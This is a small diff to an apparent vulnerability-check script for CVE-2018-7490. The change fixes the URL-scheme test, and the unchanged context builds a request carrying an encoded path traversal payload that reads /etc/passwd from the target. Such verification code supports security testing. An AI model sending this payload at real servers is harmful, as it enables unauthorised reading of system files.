@@ -18,7 +18,7 @@ class CVE_2018_7490_BaseVerify:
         }
 
     def run(self):
-        if not self.url.startswith("http") and self.url.startswith("https"):
+        if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         url = self.url + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
         try:
